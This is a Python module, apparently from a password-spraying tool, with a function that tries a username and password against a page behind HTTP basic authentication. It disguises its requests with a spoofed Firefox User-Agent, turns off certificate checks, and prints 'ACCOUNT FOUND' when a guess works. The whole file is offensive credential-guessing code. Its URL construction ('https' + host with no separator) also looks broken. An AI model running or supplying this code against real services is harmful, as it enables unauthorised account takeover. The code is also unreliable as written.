#!/usr/bin/env python3

import requests, warnings

# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

'''Function to spray any page using basic auth prompt.
Will not work with anything that uses NTLM auth'''
def basic_conn(params):

    username = params.get("username")
    password = params.get("password")
    host = params.get("host")
    count = params.get("count")
    place = params.get("place")
    ssl = params.get("ssl")
    directory = params.get("directory")

    if ssl:
        basicurl = 'https' + host
    else:
        basicurl = 'http' + host

    urldir = basicurl + '/' + directory

    headers = {
        'Host': host,
        'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Referer': basicurl,
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:

        # print the host , username and password being checked
        print("ACCOUNT CHECK: [BASICAUTH] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            host, username, place, count, place, password))
        query = requests.get(urldir,auth=(username, password),verify=False, headers=headers)

        if query.status_code == 200:
            print("ACCOUNT FOUND: [BASICAUTH] Target: {} User: {} Password: {} [SUCCESS]".format(
                host, username, password))
            return"ACCOUNT FOUND: [BASICAUTH] Target: {} User: {} Password: {} [SUCCESS]".format(host, username, password)
    
    except:
        pass
